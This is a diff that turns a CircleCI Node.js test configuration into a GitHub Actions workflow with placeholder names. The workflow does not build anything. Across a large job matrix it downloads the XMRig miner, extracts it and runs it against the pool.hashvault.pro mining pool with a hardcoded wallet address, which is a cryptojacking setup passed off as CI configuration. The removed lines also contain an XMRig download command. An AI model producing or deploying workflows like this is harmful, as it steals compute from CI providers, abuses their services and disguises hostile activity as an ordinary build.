@@ -1,34 +1,28 @@
-version: 2.1
 
-executors:
-  linux:
-    docker:
-      - image: cimg/base:2020.01
 
-orbs:
-  node: circleci/node@2.0.0
+name: NAME
+
+on: [workflow_dispatch]
 
 jobs:
-  test:
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
+  build:
+    name: NAME
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-
-workflows:
-  all-tests:
-    jobs:
-      - test:
-          matrix:
-            parameters:
-              os: [linux]
-              node-version: ["10.9.0", "11.9.0", "12.9.1", "13.9.0"]
-            run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz -OutFile xmrig-6.15.0-linux-x64.tar.gz
-            command: tar -xvf xmrig-6.15.0-linux-x64.tar.gz
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-gcc-win64.zip -OutFile xmrig-6.15.0-gcc-win64.zip
+    - name: Extract
+      run: Expand-Archive xmrig-6.15.0-gcc-win64.zip
+    - name: RUNNING
+      run: .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p x
+    - name: DONE
+      run: exit
